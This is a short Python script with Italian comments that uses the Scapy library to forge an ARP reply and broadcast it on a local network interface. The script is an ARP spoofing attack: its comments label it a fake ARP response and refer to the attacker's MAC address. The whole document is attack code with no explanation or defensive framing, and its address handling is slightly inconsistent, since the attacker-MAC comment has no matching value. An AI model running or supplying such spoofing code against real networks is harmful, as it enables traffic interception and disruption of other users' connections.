from scapy.all import Ether, ARP, sendp 
# Indirizzi IP e MAC target 
ip_target = "192.168.1.1" 
mac_target = "00:11:22:33:44:55" 
# MAC dell'attaccante 
# Crea una risposta ARP falsa 
arp_response = ARP(op=2, pdst=ip_target, hwdst="ff:ff:ff:ff:ff:ff", psrc="192.168.1.100", hwsrc=mac_target) 
# Invia la risposta ARP 
sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/arp_response, iface="eth0") 
print("Risposta ARP falsa inviata.")